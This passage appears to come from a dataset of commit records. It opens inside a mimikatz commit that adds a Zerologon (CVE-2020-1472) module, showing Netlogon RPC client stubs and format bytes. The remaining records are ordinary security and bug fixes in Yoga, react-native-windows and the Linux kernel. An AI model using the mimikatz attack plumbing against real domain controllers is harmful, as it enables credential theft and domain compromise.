    \ &logon_StubDesc, (PFORMAT_STRING) &netlogon__MIDL_ProcFormatString.Format[0],\
    \ (unsigned char *) &PrimaryName).Simple;\r\n+}\r\n+NTSTATUS NetrServerAuthenticate2(IN\
    \ LOGONSRV_HANDLE PrimaryName, IN wchar_t *AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE\
    \ SecureChannelType, IN wchar_t *ComputerName, IN PNETLOGON_CREDENTIAL ClientCredential,\
    \ OUT PNETLOGON_CREDENTIAL ServerCredential, IN OUT ULONG *NegotiateFlags)\r\n\
    +{\r\n+\treturn (NTSTATUS) NdrClientCall2((PMIDL_STUB_DESC) &logon_StubDesc, (PFORMAT_STRING)\
    \ &netlogon__MIDL_ProcFormatString.Format[60], (unsigned char *) &PrimaryName).Simple;\r\
    \n+}\r\n+NTSTATUS NetrServerPasswordSet2(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t\
    \ *AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t\
    \ *ComputerName, IN PNETLOGON_AUTHENTICATOR Authenticator, OUT PNETLOGON_AUTHENTICATOR\
    \ ReturnAuthenticator, IN PNL_TRUST_PASSWORD ClearNewPassword)\r\n+{\r\n+\treturn\
    \ (NTSTATUS) NdrClientCall2((PMIDL_STUB_DESC) &logon_StubDesc, (PFORMAT_STRING)\
    \ &netlogon__MIDL_ProcFormatString.Format[138], (unsigned char *) &PrimaryName).Simple;\r\
    \n+}\r\n+NTSTATUS NetrServerTrustPasswordsGet(IN LOGONSRV_HANDLE TrustedDcName,\
    \ IN wchar_t *AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,\
    \ IN wchar_t *ComputerName, IN PNETLOGON_AUTHENTICATOR Authenticator, OUT PNETLOGON_AUTHENTICATOR\
    \ ReturnAuthenticator, OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword,\
    \ OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedOldOwfPassword)\r\n+{\r\n+\treturn (NTSTATUS)\
    \ NdrClientCall2((PMIDL_STUB_DESC) &logon_StubDesc, (PFORMAT_STRING) &netlogon__MIDL_ProcFormatString.Format[216],\
    \ (unsigned char *) &TrustedDcName).Simple;\r\n+}\r\n+#pragma optimize(\"\", on)\r\
    \n+static const netlogon_MIDL_PROC_FORMAT_STRING netlogon__MIDL_ProcFormatString\
    \ = {0, {\r\n+\t0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x14, 0x00, 0x31,\
    \ 0x04, 0x00, 0x00, 0x00, 0x5c, 0x3c, 0x00, 0x44, 0x00, 0x46, 0x05, 0x08, 0x01,\
    \ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00,\r\n+\t0x00, 0x00, 0x02, 0x00,\
    \ 0x0b, 0x01, 0x04, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x08, 0x00, 0x14, 0x00, 0x12,\
    \ 0x21, 0x0c, 0x00, 0x14, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48,\
    \ 0x00, 0x00,\r\n+\t0x00, 0x00, 0x0f, 0x00, 0x20, 0x00, 0x31, 0x04, 0x00, 0x00,\
    \ 0x00, 0x5c, 0x5e, 0x00, 0x60, 0x00, 0x46, 0x08, 0x08, 0x01, 0x00, 0x00, 0x00,\
    \ 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x02, 0x00,\r\n+\t0x0b, 0x01, 0x04,\
    \ 0x00, 0x08, 0x00, 0x48, 0x00, 0x08, 0x00, 0x0d, 0x00, 0x0b, 0x01, 0x0c, 0x00,\
    \ 0x08, 0x00, 0x0a, 0x01, 0x10, 0x00, 0x14, 0x00, 0x12, 0x21, 0x14, 0x00, 0x14,\
    \ 0x00, 0x58, 0x01,\r\n+\t0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x1c, 0x00, 0x08,\
    \ 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x1e, 0x00, 0x20, 0x00, 0x31, 0x04,\
    \ 0x00, 0x00, 0x00, 0x5c, 0x8e, 0x02, 0x58, 0x00, 0x46, 0x08,\r\n+\t0x08, 0x01,\
    \ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x02, 0x00, 0x0b,\
    \ 0x01, 0x04, 0x00, 0x08, 0x00, 0x48, 0x00, 0x08, 0x00, 0x0d, 0x00, 0x0b, 0x01,\
    \ 0x0c, 0x00, 0x08, 0x00,\r\n+\t0x0a, 0x01, 0x10, 0x00, 0x2a, 0x00, 0x12, 0x41,\
    \ 0x14, 0x00, 0x2a, 0x00, 0x0a, 0x01, 0x18, 0x00, 0x42, 0x00, 0x70, 0x00, 0x1c,\
    \ 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x2a, 0x00,\r\n+\t0x24,\
    \ 0x00, 0x31, 0x04, 0x00, 0x00, 0x00, 0x5c, 0x56, 0x00, 0x40, 0x01, 0x46, 0x09,\
    \ 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x02,\
    \ 0x00, 0x0b, 0x01, 0x04, 0x00,\r\n+\t0x08, 0x00, 0x48, 0x00, 0x08, 0x00, 0x0d,\
    \ 0x00, 0x0b, 0x01, 0x0c, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x10, 0x00, 0x2a, 0x00,\
    \ 0x12, 0x41, 0x14, 0x00, 0x2a, 0x00, 0x12, 0x41, 0x18, 0x00, 0x5a, 0x00,\r\n\
    +\t0x12, 0x41, 0x1c, 0x00, 0x5a, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00,\r\
    \n+}};\r\n+#endif\r\n+\r\n+static const netlogon_MIDL_TYPE_FORMAT_STRING netlogon__MIDL_TypeFormatString\
    \ = {0, {\r\n+\t0x00, 0x00, 0x12, 0x08, 0x25, 0x5c, 0x11, 0x08, 0x25, 0x5c, 0x11,\
    \ 0x00, 0x08, 0x00, 0x1d, 0x00, 0x08, 0x00, 0x02, 0x5b, 0x15, 0x00, 0x08, 0x00,\
    \ 0x4c, 0x00, 0xf4, 0xff, 0x5c, 0x5b, 0x11, 0x04,\r\n+\t0xf4, 0xff, 0x11, 0x08,\
    \ 0x08, 0x5c, 0x11, 0x00, 0x02, 0x00, 0x15, 0x03, 0x0c, 0x00, 0x4c, 0x00, 0xe4,\
    \ 0xff, 0x08, 0x5b, 0x11, 0x04, 0xf4, 0xff, 0x11, 0x00, 0x08, 0x00, 0x1d, 0x01,\
    \ 0x00, 0x02,\r\n+\t0x05, 0x5b, 0x15, 0x03, 0x04, 0x02, 0x4c, 0x00, 0xf4, 0xff,\
    \ 0x08, 0x5b, 0x11, 0x04, 0x0c, 0x00, 0x1d, 0x00, 0x10, 0x00, 0x4c, 0x00, 0xbe,\
    \ 0xff, 0x5c, 0x5b, 0x15, 0x00, 0x10, 0x00, 0x4c, 0x00,\r\n+\t0xf0, 0xff, 0x5c,\
    \ 0x5b, 0x00,\r\n+}};\n\\ No newline at end of file"
  commit_message: '[new] mimikatz lsadump::zerologon (CVE-2020-1472 @SecuraBV @djrevmoon)

    [new] mimikatz lsadump::dcsync now supports NTLM auth and explicit credentials

    [internal] netlogon RPC instead of NETAPI32.dll (support ncap_ip_tcp instead of
    ncap_np)'
  commit_sha: 880c15994c4955d232f83cd2f73e5b6b1de165e7
  repo_name: gentilkiwi/mimikatz
- commit_diff:
  - '--- a/fuzz/FuzzLayout.cpp

    +++ b/fuzz/FuzzLayout.cpp

    @@ -0,0 +1,57 @@

    +/*

    + * Copyright (c) Meta Platforms, Inc. and affiliates.

    + *

    + * This source code is licensed under the MIT license found in the

    + * LICENSE file in the root directory of this source tree.

    + */

    +

    +#include <fuzzer/FuzzedDataProvider.h>

    +#include <yoga/Yoga.h>

    +#include <cstdint>

    +

    +YGFlexDirection fuzzedFlexDirection(FuzzedDataProvider& fdp) {

    +  return fdp.PickValueInArray({

    +      YGFlexDirectionColumn,

    +      YGFlexDirectionColumnReverse,

    +      YGFlexDirectionRow,

    +      YGFlexDirectionRowReverse,

    +  });

    +}

    +

    +void fillFuzzedTree(

    +    FuzzedDataProvider& fdp,

    +    YGConfigConstRef config,

    +    YGNodeRef root,

    +    size_t depth = 0) {

    +  constexpr size_t kMaxDepth = 20;

    +  constexpr size_t kMaxChildren = 20;

    +

    +  if (depth > kMaxDepth) {

    +    return;

    +  }

    +

    +  size_t children = fdp.ConsumeIntegralInRange<size_t>(0, kMaxChildren);

    +  for (size_t i = 0; i < children; i++) {

    +    YGNodeRef child = YGNodeNewWithConfig(config);

    +    YGNodeStyleSetFlexDirection(root, fuzzedFlexDirection(fdp));

    +    YGNodeStyleSetWidth(child, fdp.ConsumeFloatingPoint<float>());

    +    YGNodeStyleSetGap(

    +        child, YGGutterAll, fdp.ConsumeProbability<float>() * 100);

    +    YGNodeStyleSetHeight(child, fdp.ConsumeFloatingPoint<float>());

    +    YGNodeInsertChild(root, child, i);

    +    fillFuzzedTree(fdp, config, child, depth + 1);

    +  }

    +}

    +

    +extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {

    +  FuzzedDataProvider fdp(data, size);

    +  YGConfigRef config = YGConfigNew();

    +  YGNodeRef root = YGNodeNewWithConfig(config);

    +  fillFuzzedTree(fdp, config, root);

    +

    +  YGNodeCalculateLayout(root, YGUndefined, YGUndefined, YGDirectionLTR);

    +

    +  YGNodeFreeRecursive(root);

    +  YGConfigFree(config);

    +  return 0;

    +}'
  commit_message: "Add simple fuzz-harness (#1537)\n\nSummary:\n> This PR is based\
    \ on the proposal in https://github.com/facebook/yoga/issues/1538 inlined below,\
    \ to integrate yoga with `oss-fuzz`\n\nHey yoga team,\n\nI've recently become\
    \ interested in yoga. I'd like to suggest and champion an effort to set up some\
    \ basic fuzz-testing and combine it with google/oss-fuzz for continuous fuzzing.\
    \ I'm fully aware that you are very busy people and I don't want to overload your\
    \ review/maintenance capacity. Is this a bad time to discuss potential security/reliability\
    \ improvements?\n\nIf you're not familiar with fuzzing or oss-fuzz I've included\
    \ a few brief notes below.\n\n#### **Benefits of Fuzz-Testing**\n\n- **Dynamic\
    \ Code Testing**: Fuzz-testing challenges systems with unexpected data, aiming\
    \ to identify vulnerabilities or bugs. It\u2019s akin to an exhaustive stress-test\
    \ for the code.\n- **Detecting Hidden Vulnerabilities**: It can uncover potential\
    \ weaknesses that may not be evident in routine tests.\n- **Continuous and Automated\
    \ Testing**: With tools like Google\u2019s OSS-Fuzz, fuzz-testing can be automated,\
    \ running continuously on distributed systems, ensuring daily resilience checks.\n\
    \n#### **Google/oss-fuzz for Continuous Fuzzing**\n\n- **Automated Fuzzing**:\
    \ OSS-Fuzz undertakes comprehensive fuzz-testing daily on a distributed cluster.\n\
    - **Detailed Reporting**: OSS-Fuzz offers exhaustive reports in case of detected\
    \ anomalies, enabling effective action.\n\nI\u2019d be more than happy to lead\
    \ the effort in integrating fuzz testing with the yoga and assist in any way required.\n\
    \n#### Prior integrations\nThere have been a number of previous integrations completed\
    \ with facebook repositories and google/oss-fuzz including;\n- facebook/time\n\
    - facebook/zstd\n- facebookexperimental/starlark-rust (this was me)\n- facebook/proxygen\n\
    - facebook/hermes\n- facebook/rocksdb\n\nAs a proof of concept I created a couple\
    \ of super simple fuzz harnesses in https://github.com/facebook/yoga/issues/1537.\n\
    \nNOTE: Adding fuzz-testing and integrating with google/oss-fuzz was previously\
    \ suggested here https://github.com/facebook/yoga/pull/1055 and was rejected.\
    \ I think I've addressed the concerns raised in the first PR. While the original\
    \ PR contained what was probably a higher performance fuzzer, the new fuzzer should\
    \ be easier to integrate and doesn't introduce multiple sources of truth.\n\n\
    Pull Request resolved: https://github.com/facebook/yoga/pull/1537\n\nReviewed\
    \ By: yungsters\n\nDifferential Revision: D52800366\n\nPulled By: NickGerleman\n\
    \nfbshipit-source-id: 4957282456f3263e600d13ae6f3e983681bebda6"
  commit_sha: 1a8b80a3d50eacc3251ac1fa2403ce0baff3849e
  repo_name: facebook/yoga
- commit_diff:
  - "--- a/vnext/Microsoft.ReactNative/DynamicReader.cpp\n+++ b/vnext/Microsoft.ReactNative/DynamicReader.cpp\n\
    @@ -140,9 +140,9 @@ bool DynamicReader::GetBoolean() noexcept {\n }\n \n int64_t\
    \ DynamicReader::GetInt64() noexcept {\n-  return (m_current->type() == folly::dynamic::Type::INT64)\n\
    -      ? m_current->getInt()\n-      : (m_current->type() == folly::dynamic::Type::DOUBLE)\
    \ ? static_cast<int64_t>(m_current->getDouble()) : 0;\n+  return (m_current->type()\
    \ == folly::dynamic::Type::INT64) ? m_current->getInt()\n+      : (m_current->type()\
    \ == folly::dynamic::Type::DOUBLE) ? static_cast<int64_t>(m_current->getDouble())\n\
    +                                                            : 0;\n }\n \n double\
    \ DynamicReader::GetDouble() noexcept {"
  - "--- a/vnext/Microsoft.ReactNative/Views/DevMenu.cpp\n+++ b/vnext/Microsoft.ReactNative/Views/DevMenu.cpp\n\
    @@ -205,8 +205,8 @@ void DevMenuManager::CreateAndShowUI() noexcept {\n   if (Mso::React::ReactOptions::JsiEngine(m_context->Properties())\
    \ == Mso::React::JSIEngine::Hermes) {\n     m_samplingProfilerRevoker = devMenu.SamplingProfiler().Click(\n\
    \         winrt::auto_revoke,\n-        [wkThis = weak_from_this()](\n-      \
    \      auto & /*sender*/, xaml::RoutedEventArgs const & /*args*/) noexcept ->\
    \ winrt::fire_and_forget {\n+        [wkThis = weak_from_this()](auto & /*sender*/,\
    \ xaml::RoutedEventArgs const & /*args*/) noexcept\n+        -> winrt::fire_and_forget\
    \ {\n           if (auto strongThis = wkThis.lock()) {\n             strongThis->Hide();\n\
    \             if (!Microsoft::ReactNative::HermesSamplingProfiler::IsStarted())\
    \ {"
  - "--- a/vnext/Microsoft.ReactNative/Views/Image/ReactImage.cpp\n+++ b/vnext/Microsoft.ReactNative/Views/Image/ReactImage.cpp\n\
    @@ -259,7 +259,8 @@ winrt::fire_and_forget ReactImage::SetBackground(bool fireLoadEndEvent)\
    \ {\n       compositionBrush->TintColor(strong_this->m_tintColor);\n \n      \
    \ const auto surface = fromStream ? winrt::LoadedImageSurface::StartLoadFromStream(memoryStream)\n\
    -                                      : uri ? winrt::LoadedImageSurface::StartLoadFromUri(uri)\
    \ : nullptr;\n+          : uri                       ? winrt::LoadedImageSurface::StartLoadFromUri(uri)\n\
    +                                      : nullptr;\n \n       m_sizeChangedRevoker\
    \ = strong_this->SizeChanged(\n           winrt::auto_revoke, [compositionBrush](const\
    \ auto &, const winrt::SizeChangedEventArgs &args) {"
  commit_message: 'CG: Update async to resolve CVE-2021-43138 (#9837)


    * CG: Update async to resolve CVE-2021-43138


    This PR updates our dependency on async.


    * Change files


    * yarn format


    * Change files


    * lint fix'
  commit_sha: 3f85b243ff340a45762ece5e1fcac609c2f27383
  repo_name: microsoft/react-native-windows
- commit_diff:
  - "--- a/drivers/base/arch_topology.c\n+++ b/drivers/base/arch_topology.c\n@@ -431,9\
    \ +431,6 @@ init_cpu_capacity_callback(struct notifier_block *nb,\n \tstruct cpufreq_policy\
    \ *policy = data;\n \tint cpu;\n \n-\tif (!raw_capacity)\n-\t\treturn 0;\n-\n\
    \ \tif (val != CPUFREQ_CREATE_POLICY)\n \t\treturn 0;\n \n@@ -450,9 +447,11 @@\
    \ init_cpu_capacity_callback(struct notifier_block *nb,\n \t}\n \n \tif (cpumask_empty(cpus_to_visit))\
    \ {\n-\t\ttopology_normalize_cpu_scale();\n-\t\tschedule_work(&update_topology_flags_work);\n\
    -\t\tfree_raw_capacity();\n+\t\tif (raw_capacity) {\n+\t\t\ttopology_normalize_cpu_scale();\n\
    +\t\t\tschedule_work(&update_topology_flags_work);\n+\t\t\tfree_raw_capacity();\n\
    +\t\t}\n \t\tpr_debug(\"cpu_capacity: parsing done\\n\");\n \t\tschedule_work(&parsing_done_work);\n\
    \ \t}\n@@ -472,7 +471,7 @@ static int __init register_cpufreq_notifier(void)\n\
    \ \t * On ACPI-based systems skip registering cpufreq notifier as cpufreq\n \t\
    \ * information is not needed for cpu capacity initialization.\n \t */\n-\tif\
    \ (!acpi_disabled || !raw_capacity)\n+\tif (!acpi_disabled)\n \t\treturn -EINVAL;\n\
    \ \n \tif (!alloc_cpumask_var(&cpus_to_visit, GFP_KERNEL))"
  - "--- a/drivers/base/core.c\n+++ b/drivers/base/core.c\n@@ -125,7 +125,7 @@ static\
    \ void __fwnode_link_del(struct fwnode_link *link)\n  */\n static void __fwnode_link_cycle(struct\
    \ fwnode_link *link)\n {\n-\tpr_debug(\"%pfwf: Relaxing link with %pfwf\\n\",\n\
    +\tpr_debug(\"%pfwf: cycle: depends on %pfwf\\n\",\n \t\t link->consumer, link->supplier);\n\
    \ \tlink->flags |= FWLINK_FLAG_CYCLE;\n }\n@@ -284,10 +284,12 @@ static bool device_is_ancestor(struct\
    \ device *dev, struct device *target)\n \treturn false;\n }\n \n+#define DL_MARKER_FLAGS\t\
    \t(DL_FLAG_INFERRED | \\\n+\t\t\t\t DL_FLAG_CYCLE | \\\n+\t\t\t\t DL_FLAG_MANAGED)\n\
    \ static inline bool device_link_flag_is_sync_state_only(u32 flags)\n {\n-\treturn\
    \ (flags & ~(DL_FLAG_INFERRED | DL_FLAG_CYCLE)) ==\n-\t\t(DL_FLAG_SYNC_STATE_ONLY\
    \ | DL_FLAG_MANAGED);\n+\treturn (flags & ~DL_MARKER_FLAGS) == DL_FLAG_SYNC_STATE_ONLY;\n\
    \ }\n \n /**\n@@ -1943,6 +1945,7 @@ static bool __fw_devlink_relax_cycles(struct\
    \ device *con,\n \n \t/* Termination condition. */\n \tif (sup_dev == con) {\n\
    +\t\tpr_debug(\"----- cycle: start -----\\n\");\n \t\tret = true;\n \t\tgoto out;\n\
    \ \t}\n@@ -1974,8 +1977,11 @@ static bool __fw_devlink_relax_cycles(struct device\
    \ *con,\n \telse\n \t\tpar_dev = fwnode_get_next_parent_dev(sup_handle);\n \n\
    -\tif (par_dev && __fw_devlink_relax_cycles(con, par_dev->fwnode))\n+\tif (par_dev\
    \ && __fw_devlink_relax_cycles(con, par_dev->fwnode)) {\n+\t\tpr_debug(\"%pfwf:\
    \ cycle: child of %pfwf\\n\", sup_handle,\n+\t\t\t par_dev->fwnode);\n \t\tret\
    \ = true;\n+\t}\n \n \tif (!sup_dev)\n \t\tgoto out;\n@@ -1991,6 +1997,8 @@ static\
    \ bool __fw_devlink_relax_cycles(struct device *con,\n \n \t\tif (__fw_devlink_relax_cycles(con,\n\
    \ \t\t\t\t\t      dev_link->supplier->fwnode)) {\n+\t\t\tpr_debug(\"%pfwf: cycle:\
    \ depends on %pfwf\\n\", sup_handle,\n+\t\t\t\t dev_link->supplier->fwnode);\n\
    \ \t\t\tfw_devlink_relax_link(dev_link);\n \t\t\tdev_link->flags |= DL_FLAG_CYCLE;\n\
    \ \t\t\tret = true;\n@@ -2058,13 +2066,19 @@ static int fw_devlink_create_devlink(struct\
    \ device *con,\n \n \t/*\n \t * SYNC_STATE_ONLY device links don't block probing\
    \ and supports cycles.\n-\t * So cycle detection isn't necessary and shouldn't\
    \ be done.\n+\t * So, one might expect that cycle detection isn't necessary for\
    \ them.\n+\t * However, if the device link was marked as SYNC_STATE_ONLY because\n\
    +\t * it's part of a cycle, then we still need to do cycle detection. This\n+\t\
    \ * is because the consumer and supplier might be part of multiple cycles\n+\t\
    \ * and we need to detect all those cycles.\n \t */\n-\tif (!(flags & DL_FLAG_SYNC_STATE_ONLY))\
    \ {\n+\tif (!device_link_flag_is_sync_state_only(flags) ||\n+\t    flags & DL_FLAG_CYCLE)\
    \ {\n \t\tdevice_links_write_lock();\n \t\tif (__fw_devlink_relax_cycles(con,\
    \ sup_handle)) {\n \t\t\t__fwnode_link_cycle(link);\n \t\t\tflags = fw_devlink_get_flags(link->flags);\n\
    +\t\t\tpr_debug(\"----- cycle: end -----\\n\");\n \t\t\tdev_info(con, \"Fixed\
    \ dependency cycle(s) with %pfwf\\n\",\n \t\t\t\t sup_handle);\n \t\t}"
  - "--- a/lib/kobject.c\n+++ b/lib/kobject.c\n@@ -74,10 +74,12 @@ static int create_dir(struct\
    \ kobject *kobj)\n \tif (error)\n \t\treturn error;\n \n-\terror = sysfs_create_groups(kobj,\
    \ ktype->default_groups);\n-\tif (error) {\n-\t\tsysfs_remove_dir(kobj);\n-\t\t\
    return error;\n+\tif (ktype) {\n+\t\terror = sysfs_create_groups(kobj, ktype->default_groups);\n\
    +\t\tif (error) {\n+\t\t\tsysfs_remove_dir(kobj);\n+\t\t\treturn error;\n+\t\t\
    }\n \t}\n \n \t/*\n@@ -589,7 +591,8 @@ static void __kobject_del(struct kobject\
    \ *kobj)\n \tsd = kobj->sd;\n \tktype = get_ktype(kobj);\n \n-\tsysfs_remove_groups(kobj,\
    \ ktype->default_groups);\n+\tif (ktype)\n+\t\tsysfs_remove_groups(kobj, ktype->default_groups);\n\
    \ \n \t/* send \"remove\" if the caller did not do it but sent \"add\" */\n \t\
    if (kobj->state_add_uevent_sent && !kobj->state_remove_uevent_sent) {\n@@ -666,6\
    \ +669,10 @@ static void kobject_cleanup(struct kobject *kobj)\n \tpr_debug(\"\
    '%s' (%p): %s, parent %p\\n\",\n \t\t kobject_name(kobj), kobj, __func__, kobj->parent);\n\
    \ \n+\tif (t && !t->release)\n+\t\tpr_debug(\"'%s' (%p): does not have a release()\
    \ function, it is broken and must be fixed. See Documentation/core-api/kobject.rst.\\\
    n\",\n+\t\t\t kobject_name(kobj), kobj);\n+\n \t/* remove from sysfs if the caller\
    \ did not do it */\n \tif (kobj->state_in_sysfs) {\n \t\tpr_debug(\"'%s' (%p):\
    \ auto cleanup kobject_del\\n\",\n@@ -676,13 +683,10 @@ static void kobject_cleanup(struct\
    \ kobject *kobj)\n \t\tparent = NULL;\n \t}\n \n-\tif (t->release) {\n+\tif (t\
    \ && t->release) {\n \t\tpr_debug(\"'%s' (%p): calling ktype release\\n\",\n \t\
    \t\t kobject_name(kobj), kobj);\n \t\tt->release(kobj);\n-\t} else {\n-\t\tpr_debug(\"\
    '%s' (%p): does not have a release() function, it is broken and must be fixed.\
    \ See Documentation/core-api/kobject.rst.\\n\",\n-\t\t\t kobject_name(kobj), kobj);\n\
    \ \t}\n \n \t/* free name if we allocated it */\n@@ -1056,7 +1060,7 @@ const struct\
    \ kobj_ns_type_operations *kobj_child_ns_ops(const struct kobject *pa\n {\n \t\
    const struct kobj_ns_type_operations *ops = NULL;\n \n-\tif (parent && parent->ktype->child_ns_type)\n\
    +\tif (parent && parent->ktype && parent->ktype->child_ns_type)\n \t\tops = parent->ktype->child_ns_type(parent);\n\
    \ \n \treturn ops;"
  commit_message: "Merge tag 'driver-core-6.8-rc5' of git://git.kernel.org/pub/scm/linux/kernel/git/gregkh/driver-core\n\
    \nPull driver core fixes from Greg KH:\n \"Here are some driver core fixes, a\
    \ kobject fix, and a documentation\n  update for 6.8-rc5. In detail these changes\
    \ are:\n\n   - devlink fixes for reported issues with 6.8-rc1\n\n   - topology\
    \ scheduling regression fix that has been reported by many\n\n   - kobject loosening\
    \ of checks change in -rc1 is now reverted as some\n     codepaths seemed to need\
    \ the checks\n\n   - documentation update for the CVE process. Has been reviewed\
    \ by\n     many, the last minute change to the document was to bring the .rst\n\
    \     format back into the the new style rules, the contents did not\n     change.\n\
    \n  All of these, except for the documentation update, have been in\n  linux-next\
    \ for over a week. The documentation update has been reviewed\n  for weeks by\
    \ a group of developers, and in public for a week and the\n  wording has stabilized\
    \ for now. If future changes are needed, we can\n  do so before 6.8-final is out\
    \ (or anytime after that)\"\n\n* tag 'driver-core-6.8-rc5' of git://git.kernel.org/pub/scm/linux/kernel/git/gregkh/driver-core:\n\
    \  Documentation: Document the Linux Kernel CVE process\n  Revert \"kobject: Remove\
    \ redundant checks for whether ktype is NULL\"\n  driver core: fw_devlink: Improve\
    \ logs for cycle detection\n  driver core: fw_devlink: Improve detection of overlapping\
    \ cycles\n  driver core: Fix device_link_flag_is_sync_state_only()\n  topology:\
    \ Set capacity_freq_ref in all cases"
  commit_sha: ced59052315615ffb3c39eb96e7b33f2cff6f781
  repo_name: torvalds/linux
- commit_diff:
  - "--- a/drivers/video/fbdev/sis/sis_main.c\n+++ b/drivers/video/fbdev/sis/sis_main.c\n\
    @@ -1444,6 +1444,8 @@ sisfb_check_var(struct fb_var_screeninfo *var, struct fb_info\
    \ *info)\n \n \tvtotal = var->upper_margin + var->lower_margin + var->vsync_len;\n\
    \ \n+\tif (!var->pixclock)\n+\t\treturn -EINVAL;\n \tpixclock = var->pixclock;\n\
    \ \n \tif((var->vmode & FB_VMODE_MASK) == FB_VMODE_NONINTERLACED) {"
  commit_message: 'fbdev: sis: Error out if pixclock equals zero


    The userspace program could pass any values to the driver through

    ioctl() interface. If the driver doesn''t check the value of pixclock,

    it may cause divide-by-zero error.


    In sisfb_check_var(), var->pixclock is used as a divisor to caculate

    drate before it is checked against zero. Fix this by checking it

    at the beginning.


    This is similar to CVE-2022-3061 in i740fb which was fixed by

    commit 15cf0b8.


    Signed-off-by: Fullway Wang <fullwaywang@outlook.com>

    Signed-off-by: Helge Deller <deller@gmx.de>'
  commit_sha: e421946be7d9bf545147bea8419ef8239cb7ca52
  repo_name: torvalds/linux
- commit_diff:
  - "--- a/drivers/video/fbdev/savage/savagefb_driver.c\n+++ b/drivers/video/fbdev/savage/savagefb_driver.c\n\
    @@ -869,6 +869,9 @@ static int savagefb_check_var(struct fb_var_screeninfo   *var,\n\
    \ \n \tDBG(\"savagefb_check_var\");\n \n+\tif (!var->pixclock)\n+\t\treturn -EINVAL;\n\
    +\n \tvar->transp.offset = 0;\n \tvar->transp.length = 0;\n \tswitch (var->bits_per_pixel)\
    \ {"
  commit_message: 'fbdev: savage: Error out if pixclock equals zero


    The userspace program could pass any values to the driver through

    ioctl() interface. If the driver doesn''t check the value of pixclock,

    it may cause divide-by-zero error.


    Although pixclock is checked in savagefb_decode_var(), but it is not

    checked properly in savagefb_probe(). Fix this by checking whether

    pixclock is zero in the function savagefb_check_var() before

    info->var.pixclock is used as the divisor.


    This is similar to CVE-2022-3061 in i740fb which was fixed by

    commit 15cf0b8.


    Signed-off-by: Fullway Wang <fullwaywang@outlook.com>

    Signed-off-by: Helge Deller <deller@gmx.de>'
  commit_sha: 04e5eac8f3ab2ff52fa191c187a46d4fdbc1e288
  repo_name: torvalds/linux
- commit_diff:
  - "--- a/drivers/net/xen-netback/netback.c\n+++ b/drivers/net/xen-netback/netback.c\n\
    @@ -463,12 +463,25 @@ static void xenvif_get_requests(struct xenvif_queue *queue,\n\
    \ \t}\n \n \tfor (shinfo->nr_frags = 0; nr_slots > 0 && shinfo->nr_frags < MAX_SKB_FRAGS;\n\
    -\t     shinfo->nr_frags++, gop++, nr_slots--) {\n+\t     nr_slots--) {\n+\t\t\
    if (unlikely(!txp->size)) {\n+\t\t\tunsigned long flags;\n+\n+\t\t\tspin_lock_irqsave(&queue->response_lock,\
    \ flags);\n+\t\t\tmake_tx_response(queue, txp, 0, XEN_NETIF_RSP_OKAY);\n+\t\t\t\
    push_tx_responses(queue);\n+\t\t\tspin_unlock_irqrestore(&queue->response_lock,\
    \ flags);\n+\t\t\t++txp;\n+\t\t\tcontinue;\n+\t\t}\n+\n \t\tindex = pending_index(queue->pending_cons++);\n\
    \ \t\tpending_idx = queue->pending_ring[index];\n \t\txenvif_tx_create_map_op(queue,\
    \ pending_idx, txp,\n \t\t\t\t        txp == first ? extra_count : 0, gop);\n\
    \ \t\tfrag_set_pending_idx(&frags[shinfo->nr_frags], pending_idx);\n+\t\t++shinfo->nr_frags;\n\
    +\t\t++gop;\n \n \t\tif (txp == first)\n \t\t\ttxp = txfrags;\n@@ -481,20 +494,39\
    \ @@ static void xenvif_get_requests(struct xenvif_queue *queue,\n \t\tshinfo\
    \ = skb_shinfo(nskb);\n \t\tfrags = shinfo->frags;\n \n-\t\tfor (shinfo->nr_frags\
    \ = 0; shinfo->nr_frags < nr_slots;\n-\t\t     shinfo->nr_frags++, txp++, gop++)\
    \ {\n+\t\tfor (shinfo->nr_frags = 0; shinfo->nr_frags < nr_slots; ++txp) {\n+\t\
    \t\tif (unlikely(!txp->size)) {\n+\t\t\t\tunsigned long flags;\n+\n+\t\t\t\tspin_lock_irqsave(&queue->response_lock,\
    \ flags);\n+\t\t\t\tmake_tx_response(queue, txp, 0,\n+\t\t\t\t\t\t XEN_NETIF_RSP_OKAY);\n\
    +\t\t\t\tpush_tx_responses(queue);\n+\t\t\t\tspin_unlock_irqrestore(&queue->response_lock,\n\
    +\t\t\t\t\t\t       flags);\n+\t\t\t\tcontinue;\n+\t\t\t}\n+\n \t\t\tindex = pending_index(queue->pending_cons++);\n\
    \ \t\t\tpending_idx = queue->pending_ring[index];\n \t\t\txenvif_tx_create_map_op(queue,\
    \ pending_idx, txp, 0,\n \t\t\t\t\t\tgop);\n \t\t\tfrag_set_pending_idx(&frags[shinfo->nr_frags],\n\
    \ \t\t\t\t\t     pending_idx);\n+\t\t\t++shinfo->nr_frags;\n+\t\t\t++gop;\n \t\
    \t}\n \n-\t\tskb_shinfo(skb)->frag_list = nskb;\n-\t} else if (nskb) {\n+\t\t\
    if (shinfo->nr_frags) {\n+\t\t\tskb_shinfo(skb)->frag_list = nskb;\n+\t\t\tnskb\
    \ = NULL;\n+\t\t}\n+\t}\n+\n+\tif (nskb) {\n \t\t/* A frag_list skb was allocated\
    \ but it is no longer needed\n-\t\t * because enough slots were converted to copy\
